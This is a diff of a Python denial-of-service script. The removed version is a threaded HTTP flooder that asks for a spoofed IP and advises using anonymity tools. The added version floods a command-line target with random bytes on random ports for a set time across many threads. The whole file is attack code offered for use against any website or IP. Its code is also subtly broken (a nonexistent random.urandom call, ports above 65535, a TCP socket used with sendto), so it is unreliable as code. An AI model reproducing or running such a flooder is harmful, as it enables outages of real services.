@@ -1,28 +1,26 @@
-import threading
-import socket
+import threading, socket, random, threading, sys, time
 
-target = input('choose your target it can be a website or an ip')
-
-#the port target
-port = input('what port do you want to attack')
-
-#fake ip
-fake_ip = input('enter your fake ip, remember to use anonymity tools')
-
-already_connected = 0
+try:
+    target = str(sys.argv[1])
+    threads = int(sys.argv[2])
+    timer = float(sys.argv[3])
+except IndexError:
+    print('\n[+] Command usage: python' + sys.argv[0] + '<target> <threads> <time> !')
+    sys.exit()
+timeout = time.time() +1 * timer
 
 def attack():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((target, port))
-    sock.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
-    sock.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-    sock.close()
-    
-    global already_connected
-    already_connected += 1
-    if already_connected %1000 == 0:
-        print(already_connected)
-    
-for i in range(500):
-    thread = threading.thread(target=attack)
-    thread.start()
+    try:
+        bytes = random.urandom(1080)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        while time.time() < timeout:
+            dport = random.randint(20,99999)
+            s.sendto(bytes*random.randint(5,15),(target, dport))
+        return
+        sys.exit()
+    except:
+        pass
+print('\n[+] Starting Attack.....')
+for x in range(0, threads):
+    threading.Thread(target=attack).start()
+print('\n[+] Attack Done.')
